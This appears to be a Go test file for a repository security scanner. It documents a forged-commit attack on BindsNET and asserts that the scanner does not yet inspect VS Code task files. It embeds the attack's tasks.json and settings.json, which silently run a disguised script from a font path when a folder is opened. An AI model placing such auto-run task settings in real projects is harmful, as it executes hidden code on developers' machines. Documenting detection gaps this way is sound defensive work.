package cli

// Attack 2026-54: BindsNET forged merge commit (2026-08-29). A collaborator's
// credentials force-pushed a forged copy of merge bbafb9ae over 20 branches;
// its tree added .vscode/tasks.json (runOn: folderOpen, hidden) running
// `node ./public/fonts/fa-solid-400.woff2` (32 KB obfuscated JS) and a
// .vscode/settings.json enabling task.allowAutomaticTasks. A Dependabot merge
// carried it into master. No package release was affected (GHSA-6f2q-w3r8-xxhj).
//
// NOT COVERED, asserted as current behaviour: scan-repo reads only the files
// a bypass rule can match (isScanRepoCandidate) and has no rule for editor
// tasks; pr-scan diffs manifests, lockfiles and workflows only. Control: the
// same scan-repo inspector does flag a requirements.txt git dependency.

import "testing"

func TestAttack2026_54_BindsNETVSCodeTask(t *testing.T) {
	const tasks = `{
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check",
    "type": "shell",
    "command": "command -v node >/dev/null && node ./public/fonts/fa-solid-400.woff2 || echo",
    "windows": {"command": "where node >nul 2>nul && node .\\public\\fonts\\fa-solid-400.woff2 || echo"},
    "runOptions": {"runOn": "folderOpen"},
    "hide": true,
    "presentation": {"reveal": "never", "echo": false}
  }]
}`
	const settings = `{"task.allowAutomaticTasks": "on", "terminal.integrated.hideOnStartup": "always"}`
	for rel, body := range map[string]string{".vscode/tasks.json": tasks, ".vscode/settings.json": settings} {
		base := rel[len(".vscode/"):]
		if isScanRepoCandidate(base) || len(inspectFile(rel, base, body)) != 0 {
			t.Fatalf("scan-repo now inspects %s: update the attack-54 classification", rel)
		}
	}
	if _, ok := classifyManifest(".vscode/tasks.json"); ok || isWorkflowFile(".vscode/tasks.json") {
		t.Fatal("pr-scan now monitors .vscode/tasks.json: update the attack-54 classification")
	}

	// Control: the inspector is live — a git requirement is a proxy bypass.
	if got := inspectFile("requirements.txt", "requirements.txt", "bindsnet @ git+https://github.com/BindsNET/bindsnet\n"); len(got) == 0 {
		t.Fatal("control: scan-repo must flag a git requirement")
	}
}
